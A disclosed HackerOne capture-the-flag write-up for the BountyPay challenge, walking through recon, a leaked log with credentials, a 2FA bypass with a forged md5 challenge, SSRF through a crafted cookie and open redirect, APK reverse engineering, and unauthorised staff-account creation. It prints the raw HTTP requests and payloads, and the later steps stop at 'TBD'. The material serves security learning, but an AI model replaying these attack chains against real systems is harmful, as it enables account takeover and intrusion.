# @shakedko H1-2006 CTF writeup

## Report Details
- **Report ID**: 894623
- **URL**: https://hackerone.com/reports/894623
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-09T17:23:53.886Z
- **Disclosed**: 2020-07-06T16:02:31.016Z

## Reporter
- **Username**: shakedko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## TL;DR

Flag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.

Thank you for this awesome challenge! 

## Introduction

I have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short time. 

Coming from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.

## Tools 

I have used several tools during this process. You may find these tools in the following links:

- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.
- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/). 
- [dex2jar](https://github.com/pxb1988/dex2jar)
- [JD-GUI](http://java-decompiler.github.io/)
- Android Studio
- ngrok 
- [findomain](https://github.com/Edu4rdSHL/findomain)

## Description 

HackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: 

> We need your help! CEO 
@martenmickos
 needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf 

This meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step,as  I knew that I was on the right track but there was still something to be found. 

## Steps


- Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery)
- Open Redirect
- Information Disclosure (Log File)
- Improper Authorization
- SSRF
- Information Disclosure (Directory Listing, In-house APK)
- Reverse Enginerring (APK)
- Information Disclosure (Twitter Account)
- Authentication Bypass (Creating Sandra's user)
- CSRF
- Parameter Pollution
- Privilege Escalation via CSRF
- Information Disclosure (CEO username & password)
- SSRF
- CSS Keylogger via SSRF

### Step 1 - Reconnaissance 

#### Subdomain Enumartion

The scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:

```
$ findomain -t bountypay.h1ctf.com

Target ==> bountypay.h1ctf.com

Searching in the Facebook API... 🔍
Searching in the Bufferover API... 🔍
Searching in the Threatminer API... 🔍
Searching in the AnubisDB API... 🔍
Searching in the CertSpotter API... 🔍
Searching in the Urlscan.io API... 🔍
Searching in the Threatcrowd API... 🔍
Searching in the Crtsh database API... 🔍
Searching in the Virustotal API... 🔍
Searching in the Sublist3r API... 🔍
Searching in the Spyse API... 🔍

staff.bountypay.h1ctf.com
software.bountypay.h1ctf.com
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com

A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 2 seconds.⏲️

Good luck Hax0r 💀!
```

#### Understanding the Application 

I hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  

#### Content Discovery

After learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: 

- GET https://app.bountypay.h1ctf.com/cgit 
- GET https://app.bountypay.h1ctf.com/.git
- GET https://api.bountypay.h1ctf.com/api
- GET https://api.bountypay.h1ctf.com/api/staff
- GET https://api.bountypay.h1ctf.com//api/accounts/<word>

### Step 2 - Open Redirect

While doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon

#### Step 3 - Information Disclosure (Log File)

Scanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: 

```
cat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'
{
  "input": {
    "FUZZ": "config"
  },
  "position": 97,
  "status": 200,
  "length": 278,
  "words": 19,
  "lines": 12,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/config"
}
{
  "input": {
    "FUZZ": "index"
  },
  "position": 20,
  "status": 200,
  "length": 0,
  "words": 1,
  "lines": 1,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/index"
}
{
  "input": {
    "FUZZ": "description"
  },
  "position": 3838,
  "status": 200,
  "length": 73,
  "words": 10,
  "lines": 2,
  "redirectlocation": "",
  "url": "https://app.bountypay.h1ctf.com/cgit/description"
}
```

Looking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php]() that showed me the way to the next step: 

```
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
````

[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: 

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

Encoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: 

```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

### Step 4 - Improper Authorization

Once I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. 

Looking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=c4ca4238a0b923820dcc509a6f75849b&challenge_answer=1
```

and the response: 

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:14:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

Using this new cookie, I was logged in as Brian Oliver.

### Step 5 - SSRF

After I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. 

I looked into the request and I saw that it was doing the following request: 

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://app.bountypay.h1ctf.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,he;q=0.8
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9

```

While returning the following response:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:17:38 GMT
Content-Type: application/json
Connection: close
Content-Length: 177

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
```

At that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. 

The cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` 
Decoded: `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}` 

Considering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. 

I created a new cookie: `{"account_id":"../../redirect?url=FUZZ&","hash":"de235bffd23df6995ad4e0930baac1a2"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: 

1. Known words and files
2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. 

Putting everything together, I found a directory listing while fuzzing which leads me to the next step 

### Step 6 - Information Disclosure (Directory Listing, In-house APK)

As mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: 

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==

```

and it's response gave me the hint for the next step: 

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 09 Jun 2020 16:27:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 491

{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/&\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
```

Looking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. 

### Step 7 - Reverse Enginerring (APK)

When I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. 

In this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. 

Once I had the code, I ran the APK using Android Studio's "Profile or debug APK". 

There are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: 

- one://part
- two://part
- three://part

Each part had a required URI with different parameters that were available in the code. 

In order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` 

![APK-1 screenshot]

I figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: 

```
    if (getIntent() != null && getIntent().getData() != null) {
      String str = getIntent().getData().getQueryParameter("start");
      if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
        ...
        startActivity(new Intent((Context)this, PartTwoActivity.class));
      } 
    } 
```

Once I was on the second Activity, I saw in the code that all inputs where invsible:

```
    EditText editText = (EditText)findViewById(2131230834);
    Button button = (Button)findViewById(2131230794);
    TextView textView = (TextView)findViewById(2131231002);
    editText.setVisibility(4);
    button.setVisibility(4);
    textView.setVisibility(4
```

and all I had to do in order to make them visible was figuring out the params within the URL: 

```
      Uri uri = getIntent().getData();
      String str1 = uri.getQueryParameter("two");
      String str2 = uri.getQueryParameter("switch");
      if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textView.setVisibility(0);
      } 
```

Therefore, the URL was: `two://part?two=light&switch=on`. This resulted with a hash, an input field which asked for a header name. 

![Apk-2 Screenshot]

While doing some recon, I already saw a suspicious base64 code in the 3rd Activity:

```
  byte[] decodedDirectory = Base64.decode("aG9zdA==", 0);
  
  byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
  
  final String directory = "aG9zdA==";
  
  final String directoryTwo = "WC1Ub2tlbg==";
  
  final String headerDirectory = "header";
````

Decoding both resulted with the following strings: 

```
$ "WC1Ub2tlbg==" | base64 -d
X-Token: 
$ "aG9zdA==" | base64 -d
host
```

Using the `X-Token` header I got to the 3rd Activity, which again had insvisible components: 

```
protected void onCreate(Bundle paramBundle) {
    ...
    final EditText editText = (EditText)findViewById(2131230837);
    final Button button = (Button)findViewById(2131230796);
    editText.setVisibility(4);
    button.setVisibility(4);
    ...
```

Looking into the code, I saw that there was an HTTP rqeuest that was supposed to be fired once everything had been loaded correctly: 

```
    this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onCancelled(DatabaseError param1DatabaseError) {
              Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
            }
            
            public void onDataChange(DataSnapshot param1DataSnapshot) {
              String str = (String)param1DataSnapshot.getValue();
              if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
                String str1 = thirdParam;
                if (str1 != null) {
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.append("X-");
                  stringBuilder.append(str);
                  if (str1.equals(stringBuilder.toString())) {
                    editText.setVisibility(0);
                    button.setVisibility(0);
                    PartThreeActivity.this.thread.start();
                  } 
                } 
              } 
            }
          });
    }
```

Using the following URL: `three://part?switch=b24%3D&three=UGFydFRocmVlQWN0aXZpdHk%3D&header=X-Token` I was able to execute this code

![Apk-3 Screenshot]

I got the `HOST` header and the `X-Token` header in Android Studio's Logcat

```
2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com
2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1
2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER VALUE AND HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

![Logcat Screenshot]

It's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. 

The last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: 

1. There's a POST request to the exposed host, but something is missing. 
2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.

### Step 8 - Information Disclosure (Twitter Account)

BountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: 
https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1

[Sandra's screenshot]

### Step 9 - Authentication Bypass (Creating Sandra's user)

After I saw APK POST request, host, X-Token I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test. 

Clearly, as Sandra was part of the staff, I first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: 

```
GET /api/staff? HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1

```

Response
```
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
````

After I saw this, I tried to do the same with the following POST request: 

```
POST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

staff_id=STF:84DJKEIP38
```

But that resutled with the following reponse: 

```
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 13:15:29 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 39

["Staff Member already has an account"]
```

Now I went back to Sandra's id and tried her `staff_id`: 

```
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3&staff_name=1
```

Response:

```
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 03 Jun 2020 19:42:33 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

### Step 10 - CSRF

TBD 
### Step 11 - Parameter Pollution
TBD 
### Step 12 - Privilege Escalation via CSRF
TBD 
### Step 13 - Information Disclosure (CEO username & password)
TBD 
### Step 14 - SSRF
TBD 
### Step 15 - CSS Keylogger via SSRF
TBD 


## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

TBD

## Attachments
- apk-logcat.png
- apk-part-1.png
- apk-3_.png
- apk-2.png
- sandra-allison.png
